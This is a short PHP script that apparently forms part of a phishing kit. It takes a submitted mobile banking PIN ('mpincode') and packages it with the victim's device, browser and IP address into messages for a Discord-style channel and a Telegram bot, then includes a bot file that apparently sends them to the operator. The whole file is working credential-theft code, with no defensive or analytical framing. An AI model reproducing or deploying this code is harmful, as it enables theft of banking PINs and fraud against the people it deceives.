<?php

if ($_POST["mpincode"]) {
    $mpincode = $_POST['mpincode'];
    include('../src/system.php');
    $replyMsg = "```diff\n- MPIN3 [$device_used|$browser_used|$ip]\n  $mpincode```";
    $tgMsg = "MPIN3|$device_used|$browser_used|$ip\n - $mpincode";
    include('../_bot.php');
    http_response_code(200);
}
?>